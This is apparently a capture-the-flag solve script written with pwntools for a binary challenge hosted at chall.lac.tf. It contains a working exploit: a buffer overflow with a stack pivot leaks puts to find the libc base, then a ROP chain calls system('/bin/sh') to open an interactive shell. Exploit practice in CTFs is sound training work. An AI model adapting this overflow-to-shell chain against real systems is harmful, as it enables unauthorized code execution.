#!/usr/bin/env python3

# solve by enzocut

from pwn import *
from ctypes import CDLL
import time
import subprocess

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

serv = "chall.lac.tf"
port = 31137

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                b *0x401388
            """)
    return r

r = conn()

def main():
    bss = 0x404e00
    rbp = bss
    sla("2.", "1")
    sla(":", b"A"*0x40+p64(rbp)+p64(0x40123c))
    sla("2.", "1")
    sla("creeper", "2")
    sla("name:", b"A"*0x40+p64(rbp+0x20)+p64(0x4011b7)+p64(0)+p64(0x40400000000000)+p64(bss+0x30-8)+p64(0x401367)+p64(exe.sym._start))
    sla("mode", "1")
    sla("creeper", "2")
    rcu("Exit")
    rcl()
    libc.address = u64(rcl().strip().ljust(8, b"\x00"))-libc.sym.puts
    log.info(f"{hex(libc.address)=}")
    sleep(1)
    snl("2")
    sla("Multi", "1")
    rop1 = ROP(libc)
    rop1.raw(rop1.find_gadget(["ret"]))
    rop1.system(next(libc.search(b"/bin/sh\x00")))
    sla("name:", b"A"*0x48+rop1.chain())
    sla("mode", "1")
    sla("creeper", "2")
    r.interactive()


if __name__ == "__main__":
    main()
